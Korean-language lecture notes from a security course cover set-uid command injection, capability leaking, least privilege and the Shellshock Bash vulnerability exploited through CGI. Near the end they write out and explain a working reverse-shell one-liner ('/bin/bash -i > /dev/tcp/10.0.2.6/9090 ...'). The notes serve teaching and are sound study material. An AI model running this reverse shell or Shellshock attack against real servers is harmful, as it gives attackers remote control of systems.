27. 제 3의 프로그램 실행
	1. 유저 input이 커맨드로 해석할 여지 있음
28. 시스템 함수 -> 커맨드 실행
	1. shell 실행하고 커맨드 실행?
	2. argc: 인자 개수(arg count)
	3. char*=>8byte or 4byte이다
	4. 포인터 변수는 메모리 주소의 맨 앞쪽 값 저장하기 때문에 8 or 4이다./운영체제에 따라 다름(32bit과 64bit)
	5. 모든 포인터 변수는 4 or 8byte(메모리 시작 주소 가리키고 있음)
	6. **그러면 왜 타입이 있는지??** -> 시작 위치만 알면 얼마나 읽어야 할지 모르기 때문에 타입을 지정해 줘서 그 뒤로 얼마나 읽어야 할지 알려주기 위함
	7. 메모리 동적 할당 => heap 영역에 malloc에 length만금 할당하고 할당된 주소의 '시작 위치'가짐 => 그게 `*command`에 저장됨
	8. spirntf=> 첫번째 인자에 프린트하는 함수(원하는 곳에)
	9. 결론: command 실행하는 프로그램
29. catall이 set-uid프로그램이 됨 => /etc/shadow 실행 가능함
	1. **~={red} 밑줄 코드에서 따옴표 빼보기=~** -> 따옴표 빼면 전체를 하나의 명령어로 인식해서 공격 실패한다
30. ~={red}dash/shell은 set-uid가 euid를 root로 들어와도 알아서 권한 낮춰줌=~
    우분투 16.04부터 sh는 dash쉘로 들어가서 자동으로 루트 set-uid방어가 됨
31. 안전하게 시스템 함수 실행하는 명령어 execve()
	1. execve() -> 커맨드와 데이터 부분이 arg로 나뉘어져 있음
	2. **~={red}코드와 데이터 분리 가능=~**
	3. ~={red}execve(명령어,데이터,??)=~
32. execve로 실행하면 29page와는 다르게 '파일'로 봐서 실행함 -> 더 안전하다
33. ~={red}시스템 인풋을 이용한 공격=~
	1. /tmp에는 모든 사용자가 접근 가능(다른 유저가 만든거는 삭제 불가)
	2. symbolic 링크가 root권한을 가지게 되면 악용 가능성 있음
	3. set-uid와 결합해서 공격 가능
34. su 프로그램 예제(switch user)
	1. su는 set-uid 프로그램임(shadow를 읽어야 하기 때문에)
	2. su가 실행 -> euid가 root가 되고 비번이 맞으면 유저 변경하고 euid가 바뀐 유저로
35. getuid->ruid리턴(getuid는 RUID를 가져오기 때문에 root가 아닌 ~={red}일반 사용자를 가져온다=~)
36. 쓰기 권한이 없어서 거부됨 -> cap_leak를 쓰면 수정 가능
	1. cat_leak: 자식 쉘 띄워줌,root 아님 exit -> 자식 쉘 종료
	2. root이면 파일을 close하지 않고 shell을 띄워줌 -> 수정가능한 일반 유저 권한을 가지고 있음
	3. **shell띄우기 전에 파일을 close해야함**
37. 읽어보기
38. 실제 사례-다이나믹 링킹,파일 안닫아서 생기는 문제
39. system 함수 악용
40. **~={red}핵심 원칙: 코드와 데이터 분리=~**
41. 최소 권한: 권한을 최대한 작게(해야하는 일에 대한 권한만 주는 것)
	1. ZT(Zero Trust): 아무도 믿지 말고 최소한의 권한만(요즘 방식) -> 복잡해지지만 안전함
	2. white list: ZT임/모두 block하고 허용할 것만 허용 -> 복잡하지만 안전
	3. black list: 모두 허가하고 특정 것만 block -> 간단하지만 취약
---
### Ch4. Shell shock
2. Shell shock 취약점
	1. Bash shell에서 발견되었음/환경변수와 관련됨/2014년에 발견
3. Shell에서 함수 정의
	1. Shell은 인터프리터
	2. 인터프리터: 유저와 커널간 연결=>커널 리소스 사용하기 위해
	3. 함수명 () {  }: 반드시 `() {`사이에 한칸 띄워야 함
	4. 함수 보는 명령어: declare -f 함수명
	5. 함수 삭제: unset
4. export 명령어
	1. 선언한 변수 값을 명시적으로 자식이 사용 가능하게 만듦
	2. /bin/bash하면 자식 쉘이 나옴 -> 자식 쉘에서 declare foo하면 foo 사용가능
	3. foo -> export -> 자식 쉘 실행 -> 자식에서 foo(but 부모쉘은 백그라운드에서 살아 있음)
	4. 자식 프로세스 생성: fork()
5. 코드
	1. "변수" 선언: '='가 있기 때문에
	2. export foo: 변수 foo export
	3. declare: 아무것도 안나옴(foo가 변수이기 때문에)
	4. 패치이후 안전한 자식 쉘 
		1. **foo가 변수임**
		2. declare 안나옴-**foo가 변수이기 때문에 안나옴**
		3. echo $foo하면 나옴-foo가 변수이기 때문에
	5. 패치 안된 자식 쉘
		1. declare하면 함수가 나옴 -> 함수로 인식했기 때문에
		2. echo $foo는 아무것도 안나옴 -> foo를 함수로 인식했기 때문에
6. 부모 쉘
	1. 자식 쉘 실행 했는데 extra가 나옴
	2. 부모에서 데이터로 만들었는데 자식 쉘에서 아무것도 안했는데 실행 하였음
7. shell 소스 코드
	1. 변수 초기화 함수에 '파싱하고 실행'하는 함수 있음
	2. STREQN에 `() {` => 길이가 4이면 함수로 인식한다
	3. LineA는 변수,LineB는 함수
	4. 실수
		1. `() {`만 보고 함수 판별
		2. 실행함
8. 데이터와 코드를 분리하지 않음
9. 수정함
10. **~={red}자식 쉘에서 쉘에 foo 환경변수를 출력해보면 변수를 구분하기 위해서 `%%`넣어놓음->`%%`로 함수와 변수를 구분하게 패치함=~**
	1. `$$`의 의미: 현재 프로세스ID(PID)
	2. 프로세스도 파일임(`/proc`에}들어있음)
	3. 명령어에 `| grep foo` => `|`: 넘김의 의미
	4. 명령 실행하고 `|`를 통해 grep foo로 넘김
	5. grep foo: foo 찾기
	6. 결과 : 함수와 변수 구분하기 위해 구분자 `%%`추가하여 해결
11. 조건 1. Bash 실행 2. ..??? 나중에 다시
12. CGI: 프로그램 특정 구조(CGI가 아파치로부터 받아서 shell 실행 후 아파치에 반환)
	1. CGI 실행할 때 fork()하여 취약한 bash 실행함
	2. 결곤: CGI 내부까지 클라이언트가 관여 가능
13. 간단한 CGI 프로그램 구성
	1. 왼쪽: 클라이언트 측|오른쪽: 서버 측 (서로 연관 있음)
	2. 서버측: 유저 데이터를 서버측 환경 변수로 저장함
	3. CGI 동작 방식: 클라이언트 <-> 웹 서버 <-> GCI
		1. 1. HTTP Request: 사용자가 웹 페이지의 특정 부분을 클릭하거나 양식을 제출
		2. CGI 스크립트를 게이트웨이로 다른 파일이나 프로그램에 연계 → 처리 실행
		3. CGI 스크립트는 그 요청을 받아서 필요한 작업을 수행한 후 결과를 웹 서버에 다시 전송
14. 웹 서버는 이 결과를 사용자의 웹 브라우저에 전송하여 사용자에게 보여줌 -> 위험
15. CURL로 헤더에 명시적으로 **~={red}shell shock 악용해서=~** 다른 데이터 담아서 보냄(공격자가 데이터 지정 가능) 
	1. 응답 패킷에 직접 request 보낸 데이터가 담겨서 옮
16. 공격자가 curl로 의미 있는 데이터 보냄
	1. 함수로 인식하게끔 보냄/함수 실행 한 뒤 다음 명령어 실행
	2. 안의 명령어는 서버의 디렉터리 내용 -> 클라이언트로 디렉토리 내용이 넘어옴
17. ㄷ
18. **~={red}공격하는 머신에서 입력과 출력을 모두 할 수 있게 만드는 방법: 리버스 쉘-리다이렉팅 이용=~**
19. remote shell-원격 쉘(sh 이용)(원격 접속)
    ex) 집에서 학교 서버에 접속 할 때
    reverse shell: 역 쉘: 서버 -> 클라이언트/리스닝 서버를 클라이언트에서 실행
20. ㄷ
21. 리다이렉팅?
	1. 옵션-1: 인터렉티브 모드
	2. 라인1: 기본 인터렉티브
	3. 라인2: 아웃풋을 > `OO`에 뿌려라(아웃풋이 9090에서 나오고 입력을 사용자(서버)가 함)-1 생략됨
	4. 0: stdin/1:stdout/2:stderror
	5. &1: stdout참조: stdout을 참조하라는 의미(1번 디스크립터)
	6. 라인3: reverse shell
		1. 출력물은 9090으로 보내고 입력을 &1에서 받고 std error의 출력을 9090(&1)에서 출력
		2. 9090에서 입력,출력 모두 함 => 쉘 제어 가능해짐
		3. 0<&1: 표준 입력(0)을 표준 출력(1)디스크립터에서 가져오도록 설정
		4. 2>&1: 표준 에러(2)를 표준 출력(1)디스크립터로 리디렉션하도록 설정
		5. 인터렉티브 모드: 사용자가 명령어 입력하고 결과를 볼 수 있는 상태
		6. /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1  2>&1
			1. bash 셸을 인터렉티브 모드로 실행해라
			2. 셸 실행을 9090포트로 보내라
			3. 이때 입력(0)은 출력에서(1) 받고 에러(2)도 출력(1)로 보내라
22. 리버스 쉘을 이용한 shell shock 취약점 공격